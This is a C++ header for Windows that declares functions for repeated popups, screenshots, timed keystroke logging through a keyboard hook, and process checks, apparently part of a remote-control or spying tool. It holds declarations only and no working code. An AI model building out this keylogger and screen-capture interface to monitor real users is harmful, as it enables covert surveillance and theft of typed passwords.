#pragma once
#include <string>
#include <Windows.h>
#include <vector>

static constexpr size_t SLEEP_BETWEEN_POPUPS_MILLIS = 100;
static std::vector<DWORD> g_key_logger_key_codes;

namespace windows
{
bool do_popup(const std::string& window_name, const std::string& text, DWORD flags);

void do_popups(size_t count, const std::string& window_name, const std::string& text, DWORD flags);

std::string take_screenshot();

BOOL get_message_with_timeout(MSG* msg, unsigned int timeout);

std::string log_keys(unsigned int duration_seconds);

LRESULT CALLBACK log_keys_hook(int n_code, WPARAM w_param, LPARAM l_param);

bool is_process_running(const std::string& name);
}
